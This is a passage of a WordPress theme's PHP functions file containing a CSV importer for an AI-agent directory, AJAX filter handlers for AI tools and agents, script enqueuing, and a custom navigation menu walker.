                <li><strong>tagline</strong> (Optional) - Short excerpt/tagline</li>
                <li><strong>label</strong> (Optional) - Categories, comma-separated</li>
                <li><strong>web url</strong> (Optional) - Website URL</li>
                <li><strong>pricing model</strong> (Optional) - Pricing options, comma-separated</li>
                <li><strong>Features</strong> (Optional) - Features as tags, comma-separated</li>
                <li><strong>logo</strong> (Optional) - Logo image URL</li>
                <li><strong>image</strong> (Optional) - Featured image URL</li>
                <li><strong>option price</strong> (Optional) - Price amount</li>
                <li><strong>currency</strong> (Optional) - Currency code</li>
            </ul>
        </div>
        <form method="post" enctype="multipart/form-data">
            <?php wp_nonce_field('ai_agent_csv_import', 'ai_agent_csv_import_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th scope="row"><label for="csv_file">Select CSV File</label></th>
                    <td>
                        <input type="file" name="csv_file" id="csv_file" accept=".csv" required>
                    </td>
                </tr>
            </table>
            <p class="submit">
                <input type="submit" name="submit_csv_import" class="button button-primary" value="Import CSV">
            </p>
        </form>
        <?php
        // Process the form submission
        if (isset($_POST['submit_csv_import']) && isset($_FILES['csv_file'])) {
            if (!wp_verify_nonce($_POST['ai_agent_csv_import_nonce'], 'ai_agent_csv_import')) {
                wp_die('Security check failed');
            }
            if (!current_user_can('manage_options')) {
                wp_die('You do not have sufficient permissions to access this page.');
            }
            $file = $_FILES['csv_file'];
            if ($file['error'] !== UPLOAD_ERR_OK) {
                echo '<div class="error"><p>Error uploading file. Please try again.</p></div>';
            } else {
                $handle = fopen($file['tmp_name'], 'r');
                if ($handle !== false) {
                    $headers = fgetcsv($handle);
                    $row = 2;
                    $imported = 0;
                    $errors = array();
                    while (($data = fgetcsv($handle)) !== false) {
                        try {
                            $title = isset($data[0]) ? trim($data[0]) : '';
                            $description = isset($data[1]) ? trim($data[1]) : '';
                            if (empty($title) || empty($description)) {
                                $errors[] = "Row $row: Title and Description are required.";
                                $row++;
                                continue;
                            }
                            $tagline = isset($data[2]) ? trim($data[2]) : '';
                            $labels = isset($data[3]) ? array_map('trim', explode(',', $data[3])) : array();
                            $web_url = isset($data[4]) ? trim($data[4]) : '';
                            $pricing_options = isset($data[5]) ? array_map('trim', explode(',', $data[5])) : array();
                            $features = isset($data[6]) ? array_map('trim', explode(',', $data[6])) : array();
                            $logo_url = isset($data[7]) ? trim($data[7]) : '';
                            $image_url = isset($data[8]) ? trim($data[8]) : '';
                            $amount = isset($data[9]) ? trim($data[9]) : '';
                            $currency = isset($data[10]) ? trim($data[10]) : '';
                            $post_data = array(
                                'post_title' => $title,
                                'post_content' => $description,
                                'post_excerpt' => $tagline,
                                'post_status' => 'publish',
                                'post_type' => 'ai-agent'
                            );
                            $post_id = wp_insert_post($post_data);
                            if (!is_wp_error($post_id)) {
                                if (!empty($labels)) {
                                    foreach ($labels as $cat) {
                                        if (!term_exists($cat, 'ai-agent-category')) {
                                            wp_insert_term($cat, 'ai-agent-category');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $labels, 'ai-agent-category');
                                }
                                if (!empty($pricing_options)) {
                                    foreach ($pricing_options as $opt) {
                                        if (!term_exists($opt, 'ai-agent-pricing-option')) {
                                            wp_insert_term($opt, 'ai-agent-pricing-option');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $pricing_options, 'ai-agent-pricing-option');
                                }
                                if (!empty($features)) {
                                    foreach ($features as $tag) {
                                        if (!term_exists($tag, 'ai-agent-tag')) {
                                            wp_insert_term($tag, 'ai-agent-tag');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $features, 'ai-agent-tag');
                                }
                                if (!empty($web_url)) {
                                    update_post_meta($post_id, '_website_url', esc_url_raw($web_url));
                                }
                                if (!empty($amount)) {
                                    update_post_meta($post_id, '_amount', $amount);
                                }
                                if (!empty($currency)) {
                                    update_post_meta($post_id, '_currency', $currency);
                                }
                                if (!empty($logo_url)) {
                                    $existing_logo_id = wb_get_attachment_id_by_filename($logo_url);

                                    if ($existing_logo_id) {
                                        // Use existing attachment
                                        $logo_url_attached = wp_get_attachment_url($existing_logo_id);
                                        update_post_meta($post_id, '_logo', $logo_url_attached);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $logo_id = media_sideload_image($logo_url, $post_id, '', 'id');
                                        if (!is_wp_error($logo_id)) {
                                            $logo_url_attached = wp_get_attachment_url($logo_id);
                                            update_post_meta($post_id, '_logo', $logo_url_attached);
                                        } else {
                                            update_post_meta($post_id, '_logo', $logo_url);
                                        }
                                    }
                                }
                                if (!empty($image_url)) {
                                    $existing_image_id = wb_get_attachment_id_by_filename($image_url);

                                    if ($existing_image_id) {
                                        // Use existing attachment
                                        set_post_thumbnail($post_id, $existing_image_id);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $image_id = media_sideload_image($image_url, $post_id, '', 'id');
                                        if (!is_wp_error($image_id)) {
                                            set_post_thumbnail($post_id, $image_id);
                                        }
                                    }
                                }
                                $imported++;
                            } else {
                                $errors[] = "Row $row: Failed to create post - " . $post_id->get_error_message();
                            }
                        } catch (Exception $e) {
                            $errors[] = "Row $row: " . $e->getMessage();
                        }
                        $row++;
                    }
                    fclose($handle);
                    echo '<div class="notice notice-success"><p>Successfully imported ' . $imported . ' AI Agents.</p></div>';
                    if (!empty($errors)) {
                        echo '<div class="notice notice-error"><p>Errors occurred during import:</p><ul>';
                        foreach ($errors as $error) {
                            echo '<li>' . esc_html($error) . '</li>';
                        }
                        echo '</ul></div>';
                    }
                } else {
                    echo '<div class="error"><p>Error reading CSV file. Please try again.</p></div>';
                }
            }
        }
        ?>
    </div>
<?php
}

function enqueue_alpinejs()
{
    wp_enqueue_script(
        'alpine-js',
        'https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js',
        [],
        null,
        true
    );
}

add_action('wp_enqueue_scripts', 'enqueue_alpinejs');

function ajax_filter_ai_tools()
{
    // Check for nonce security
    check_ajax_referer('filter_nonce', 'nonce');

    $args = array(
        'post_type' => 'ai-tool',
        'posts_per_page' => 16,
    );

    // Filter by category
    if (!empty($_POST['category'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-category',
            'field' => 'slug',
            'terms' => $_POST['category'],
        );
    }

    // Filter by features
    if (!empty($_POST['features'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-tag',
            'field' => 'slug',
            'terms' => $_POST['features'],
        );
    }

    // Filter by pricing options
    if (!empty($_POST['pricing'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-pricing-option',
            'field' => 'slug',
            'terms' => $_POST['pricing'],
        );
    }

    $query = new WP_Query($args);

    if ($query->have_posts()):
        while ($query->have_posts()):
            $query->the_post();
            ?>
            <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                <div class="flex flex-col flex-1 w-full gap-3">
                    <?php if (has_post_thumbnail()): ?>
                        <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                    <?php else: ?>
                        <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                    <?php endif; ?>
                    <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                    <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                    <div class="ai-tool-features">
                        <?php
                        $tags = get_the_terms(get_the_ID(), 'ai-tool-tag');
                        if ($tags && !is_wp_error($tags)) {
                            echo '<ul class="feature-list flex gap-2 flex-wrap">';
                            foreach ($tags as $tag) {
                                echo '<li class="text-[var(--primary)] bg-[#0F44F31A] p-2 text-[14px] font-normal rounded-full">' . esc_html($tag->name) . '</li>';
                            }
                            echo '</ul>';
                        } else {
                            echo '<p>No tags available.</p>';
                        }
                        ?>
                    </div>
                </div>
            </a>
            <?php
        endwhile;
    else:
        echo '<p class="text-center w-full">' . __('No tools found.', 'wb') . '</p>';
    endif;

    wp_reset_postdata();
    wp_die();
}

add_action('wp_ajax_filter_ai_tools', 'ajax_filter_ai_tools');
add_action('wp_ajax_nopriv_filter_ai_tools', 'ajax_filter_ai_tools');

function enqueue_filter_scripts()
{
    wp_enqueue_script('filter-ajax', get_template_directory_uri() . '/js/filter-ajax.js', array('jquery'), null, true);
    wp_localize_script('filter-ajax', 'filter_vars', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('filter_nonce')
    ));
}

add_action('wp_enqueue_scripts', 'enqueue_filter_scripts');

// Enqueue AI Agents filter script
function enqueue_ai_agents_filter_scripts()
{
    if (is_post_type_archive('ai-agent') || is_tax('ai-agent-category')) {
        wp_enqueue_script(
            'ai-agents-filter',
            get_template_directory_uri() . '/js/ai-agents-filter.js',
            array('jquery'),
            '1.0.0',
            true
        );

        // Localize script with ajax url and nonce
        wp_localize_script('ai-agents-filter', 'ajax_object', array(
            'ajax_url' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('ai_agents_filter_nonce')
        ));
    }
}

add_action('wp_enqueue_scripts', 'enqueue_ai_agents_filter_scripts');

// AJAX handler for filtering AI Agents
add_action('wp_ajax_filter_ai_agents', 'filter_ai_agents_callback');
add_action('wp_ajax_nopriv_filter_ai_agents', 'filter_ai_agents_callback');

function filter_ai_agents_callback()
{
    // Verify nonce
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'ai_agents_filter_nonce')) {
        wp_send_json_error('Invalid nonce');
    }

    // Get and sanitize input
    $category = isset($_POST['category']) ? sanitize_text_field($_POST['category']) : '';

    // Handle features - could be array or JSON string
    $features = array();
    if (isset($_POST['features'])) {
        if (is_array($_POST['features'])) {
            $features = array_map('sanitize_text_field', $_POST['features']);
        } elseif (is_string($_POST['features'])) {
            $decoded = json_decode(stripslashes($_POST['features']), true);
            $features = is_array($decoded) ? array_map('sanitize_text_field', $decoded) : array();
        }
    }

    // Handle pricing - could be array or JSON string
    $pricing = array();
    if (isset($_POST['pricing'])) {
        if (is_array($_POST['pricing'])) {
            $pricing = array_map('sanitize_text_field', $_POST['pricing']);
        } elseif (is_string($_POST['pricing'])) {
            $decoded = json_decode(stripslashes($_POST['pricing']), true);
            $pricing = is_array($decoded) ? array_map('sanitize_text_field', $decoded) : array();
        }
    }

    // Setup query args
    $args = array(
        'post_type' => 'ai-agent',
        'posts_per_page' => 12,
        'paged' => 1,  // Always show first page on filter
    );

    // Add category filter
    if (!empty($category)) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-agent-category',
            'field' => 'slug',
            'terms' => $category,
        );
    }

    // Add features filter
    if (!empty($features)) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-agent-tag',
            'field' => 'slug',
            'terms' => $features,
            'operator' => 'AND',
        );
    }

    // Add pricing filter
    if (!empty($pricing)) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-agent-pricing-option',
            'field' => 'slug',
            'terms' => $pricing,
        );
    }

    // Set relation for multiple tax queries
    if (isset($args['tax_query']) && count($args['tax_query']) > 1) {
        $args['tax_query']['relation'] = 'AND';
    }

    $query = new WP_Query($args);
    ob_start();

    if ($query->have_posts()):
        while ($query->have_posts()):
            $query->the_post();
            ?>
            <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                <div class="flex flex-col flex-1 w-full gap-3">
                    <?php if (has_post_thumbnail()): ?>
                        <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                    <?php else: ?>
                        <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                    <?php endif; ?>
                    <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                    <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                    <div class="ai-agent-features">
                        <?php
                        $tags = get_the_terms(get_the_ID(), 'ai-agent-tag');
                        if ($tags && !is_wp_error($tags)) {
                            echo '<ul class="feature-list flex gap-2 flex-wrap">';
                            foreach ($tags as $tag) {
                                echo '<li class="text-[var(--primary)] bg-[#0F44F31A] p-2 text-[14px] font-normal rounded-full">' . esc_html($tag->name) . '</li>';
                            }
                            echo '</ul>';
                        } else {
                            echo '<p>No tags available.</p>';
                        }
                        ?>
                    </div>
                </div>
            </a>
            <?php
        endwhile;
        wp_reset_postdata();
    else:
        ?>
        <p class="text-center w-full col-span-3"><?php _e('No agents found.', 'wb'); ?></p>
        <?php
    endif;

    $html = ob_get_clean();
    wp_send_json_success(array('html' => $html));
}

class Custom_Nav_Walker extends Walker_Nav_Menu
{
    function start_lvl(&$output, $depth = 0, $args = null)
    {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<ul class=\"submenu pl-4 mt-2\">\n";
    }

    function start_el(&$output, $item, $depth = 0, $args = null, $id = 0)
    {
        $classes = empty($item->classes) ? [] : (array) $item->classes;
        $has_children = in_array('menu-item-has-children', $classes);

        $class_names = join(' ', array_filter($classes));
        $class_names = $class_names ? ' class="' . esc_attr($class_names) . '"' : '';

        $output .= "<li$class_names>";

        $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
        $attributes .= !empty($item->url) ? ' href="' . esc_url($item->url) . '"' : '';
        $attributes .= ' class="block py-2 px-3 hover:bg-[var(--secondary)] rounded"';

        $output .= '<a' . $attributes . '>';
        $output .= apply_filters('the_title', $item->title, $item->ID);
        $output .= '</a>';

        // if ($has_children && $depth === 0) {
        //     $output .= '<span class="ml-2">▼</span>';
        // }
    }

    function end_el(&$output, $item, $depth = 0, $args = null)
    {
        $output .= "</li>\n";
    }

    function end_lvl(&$output, $depth = 0, $args = null)
    {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n";
    }
}
